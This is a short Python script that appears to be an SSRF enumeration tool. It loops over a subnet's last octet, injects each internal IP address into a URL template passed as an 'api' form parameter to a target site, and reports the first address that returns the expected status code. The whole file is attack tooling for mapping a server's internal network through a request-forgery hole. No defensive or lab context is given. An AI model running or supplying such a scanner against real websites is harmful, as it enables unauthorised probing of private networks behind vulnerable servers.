import argparse
import requests
from urllib.parse import quote

def main():
    parser = argparse.ArgumentParser(description="Brute-force a subnet for the API parameter")
    parser.add_argument("url", help="Base URL for requests")
    parser.add_argument("--method", default="POST", help="Request method (default is POST)")
    parser.add_argument("--cookie", help="Cookie for the request")
    parser.add_argument("--user-agent", help="User-Agent for the request")
    parser.add_argument("--headers", help="Additional headers in the format 'Key: Value; Key2: Value2'")
    parser.add_argument("--api-template", required=True, help="Template for the API parameter, where {} will be replaced with the IP")
    parser.add_argument("--ip-base", required=True, help="Base IP, e.g., 192.168.0.")
    parser.add_argument("--ip-range", required=True, help="Range for the last octet, e.g., 0-255")
    parser.add_argument("--success-code", type=int, default=302, help="Expected status code for success")

    args = parser.parse_args()

    start, end = map(int, args.ip_range.split("-"))
    ip_list = [f"{args.ip_base}{i}" for i in range(start, end + 1)]

    headers = {}
    if args.user_agent:
        headers["User-Agent"] = args.user_agent
    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.headers:
        for header in args.headers.split(";"):
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()

    for ip in ip_list:
        api_url = args.api_template.format(ip)
        encoded_api = quote(api_url)
        data = f"api={encoded_api}"

        try:
            response = requests.request(args.method, args.url, headers=headers, data=data)
            if response.status_code == args.success_code:
                print(f"Success with IP: {ip}")
                break
            else:
                print(f"Failed with IP: {ip} (HTTP {response.status_code})")
        except requests.RequestException as e:
            print(f"Request error for IP {ip}: {e}")
            continue

if __name__ == "__main__":
    main()